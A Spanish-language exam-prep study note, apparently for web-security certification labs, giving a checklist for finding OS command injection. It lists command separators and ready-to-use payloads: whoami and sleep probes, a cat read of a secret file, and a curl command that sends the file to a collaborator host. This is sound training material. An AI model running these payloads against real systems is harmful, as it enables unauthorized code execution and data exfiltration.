---
aliases:
  - to-do OS Command Injection
tags:
  - exam/to-do
  - vuln/os-command-injection
---

# OS Command Injection — Qué probar

> Técnica → [[vulnerabilities/027-os-command-injection/os-command-injection|entry point]] · ejemplos 001–006

## 🚩 Flags

> [!danger] 🚩 ¿Está? — acá es casi evidente
> **Regla: si el admin toca un parámetro, se prueba.** Cualquier request con parámetro (form, panel, config, stock, feedback, headers `User-Agent`/`Referer`) = motivo suficiente. Barato de probar, premio = **RCE** → `cat /home/carlos/secret`.

## 🎯 Objetivo (Stage 3)
- **RCE** → leer **`/home/carlos/secret`**.

## ♾️ Independiente del stage
- [ ] **Barré TODOS los parámetros** con separadores: `;` `|` `||` `&` `&&` `$(...)` `` `...` `` `%0a`.
- [ ] **In-band** (¿vuelve salida?) → `1|whoami` → [[vulnerabilities/027-os-command-injection/examples/001-simple-in-band|001]].
- [ ] **Ciego** → time delay `x||sleep+5||` ([[vulnerabilities/027-os-command-injection/examples/002-blind-time-delay|002]]) o OAST/DNS ([[vulnerabilities/027-os-command-injection/examples/004-blind-oob-interaction|004]]).
- [ ] **Leer:** `;cat+/home/carlos/secret` (in-band) o exfil OOB.
- [ ] **No cabe en DNS →** POST entero: `x=||curl+--data+@/home/carlos/secret+https://COLLAB||` → [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo|006 ⭐]].

## 🔗 Referencias
- [[vulnerabilities/027-os-command-injection/os-command-injection|entry point]] · ejemplos 001–006
